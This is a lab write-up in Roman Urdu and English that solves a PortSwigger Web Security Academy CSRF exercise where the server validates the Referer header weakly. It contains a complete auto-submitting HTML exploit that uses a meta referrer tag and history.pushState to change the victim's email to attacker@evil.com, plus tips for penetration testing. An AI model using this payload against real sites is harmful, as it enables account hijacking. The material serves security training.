**CSRF with Broken Referer Validation**

---

**Lab Ka Naam:** CSRF with broken Referer validation
**Lab Ka Maqsad:** Email update functionality mein CSRF vulnerability exploit karna, jahan Referer header ki validation weak hai.

---

### ✅ Step-by-step Lab Solve Tareeqa (Meri Zubaan Mein):

**1. Login & Initial Setup:**

* Sab se pehle maine credentials daale: `wiener : peter`
* Login karne ke baad maine email update kiya
* Burp Suite open kiya aur proxy se email change request ko pakra
* Request ko "Send to Repeater" kiya

**2. Request Analysis in Repeater:**

* Repeater mein dekha toh koi CSRF token nahi tha
* CSP (Content Security Policy) bhi nahi lagi hui thi
* Referer header present tha jisme URL kuch aisa tha:
  `https://0a00002904ee2ec582206a2500a00073.web-security-academy.net/my-account?id=wiener`

**3. Referer Header Testing:**

* Jab maine Referer header ko hataaya, toh server ne error diya: `Invalid Referer header`
* Fir maine Referer header ko modify kiya kuch is tarah:
  `https://ssw0a00002904ee2ec582206a2500a00073.web-security-academy.net/my-account?id=wiener`
* Yahaan par maine "ssw" add kiya domain ke aage aur request accept ho gayi
* Fir maine test kiya ke agar original domain kahin bhi ho (start ya end mein), server request accept kar leta hai

**4. CSRF Exploit Banana (Exploit Server):**

* Fir maine exploit server par HTML payload likha jo automatically email update kare:

```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
    <script>
      history.pushState("", "", "/?0a00002904ee2ec582206a2500a00073.web-security-academy.net");
    </script>
  </head>
  <body>
    <form action="https://0a00002904ee2ec582206a2500a00073.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="csrf" value="XYZ-CSRF-TOKEN-NHI-CHAHIYE" />
      <input type="submit" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**5. Important Cheezein Jo Maine Seekhi:**

* `<meta name="referrer" content="unsafe-url">` ka matlab browser ko force karna ke woh Referer header mein poora URL bheje (including query string)
* `history.pushState("", "", "/?original-domain")` ka matlab: URL silently change hota hai bina reload ke, taake Referer mein original domain aajaye
* Server ne Referer header mein bas original domain ka hona check kiya tha, poori validation nahi thi

**6. Final Step:**

* Exploit ko "Store" kiya
* "View exploit" pe click karke test kiya
* Sab theek tha, toh "Deliver to victim" button dabaya
* Victim ka email update ho gaya with `attacker@evil.com`
* **Lab Solve Ho Gaya!**

---

### 🔎 Real-World Tip (Penetration Testing)

Agar kabhi kisi app mein sirf Referer based CSRF protection mile, toh hamesha test karo:

* Kya Referer remove karne pe block hota hai?
* Kya partial match pe server accept karta hai?
* Kya `pushState()` aur `<meta name="referrer">` se bypass ho sakta hai?

Yeh sab exploit karne layak hota hai agar Referer validation weak ho.

---
